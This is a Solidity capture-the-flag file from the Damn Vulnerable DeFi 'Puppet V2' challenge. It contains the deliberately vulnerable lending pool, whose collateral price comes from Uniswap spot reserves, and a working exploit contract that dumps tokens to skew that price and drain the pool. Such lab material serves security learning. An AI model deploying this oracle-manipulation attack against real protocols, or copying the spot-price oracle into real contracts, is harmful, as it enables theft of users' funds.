// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

/**
 * @title PuppetV2Pool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetV2Pool {
    using SafeMath for uint256;

    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;

    mapping(address => uint256) public deposits;

    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);

    constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress)
        public
    {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
     * @notice Allows borrowing tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        // Calculate how much WETH the user must deposit
        uint256 amount = calculateDepositOfWETHRequired(borrowAmount);

        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), amount);

        // internal accounting
        deposits[msg.sender] += amount;

        require(_token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        uint256 depositFactor = 3;
        return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether);
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
    }
}

// Write your exploit contract below
/**
 * `borrow()` relies on the `_getOracleQuote()` which essentially depends on reserve ratio.
 * If we can manipulate the reserve ratio temporarily, we can get a a low quote from the exchange and 
 * then use it to deposit very less WETH to withdraw a very large amount of tokens, essentially draining
 * the pool using price manipulation.
 * 
 * How can we manipulate the price?
 * Since Uniswap exchange has very low liquidity (100 tokens + 10 eth) compared to
 * player balance (10,000 tokens + 20 eth), player cna easily manipulate the price by selling his tokens. 
 */
contract ExploitContract {
    PuppetV2Pool private lendingPool;
    IUniswapV2Router02 private router;
    IERC20 private token;
    address private weth;

    constructor(
        address lendingPool_,
        address router_,
        address weth_,
        address token_
    ) public {
        lendingPool = PuppetV2Pool(lendingPool_);
        router = IUniswapV2Router02(router_);
        weth = weth_;
        token = IERC20(token_);
    }

    function exploit() public payable {
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(router), tokenBalance);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = weth;

        // sell tokens to manipulate the price. The below function will update the reserve ratio as (10 - amountOut) / (100+10000)
        // sell 10k tokens for minimum of 9 ETH
        uint[] memory amounts = router.swapExactTokensForETH(
            tokenBalance,
            9 ether,
            path,
            address(this),
            block.timestamp * 2
        );

        // check if ether balance >= collateral requirement to borrow 10 million tokens
        uint256 collateralAmount = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);
        require(collateralAmount <= msg.value + amounts[1], "high requirement");

        // convert ETH to WETH
        IWETH(weth).deposit{value: collateralAmount}();

        // approve lendingPool to spend WETH
        IERC20(weth).approve(address(lendingPool), collateralAmount);
        // borrow 1 million tokens
        lendingPool.borrow(1_000_000e18);

        // transfer tokens to player
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable { }
}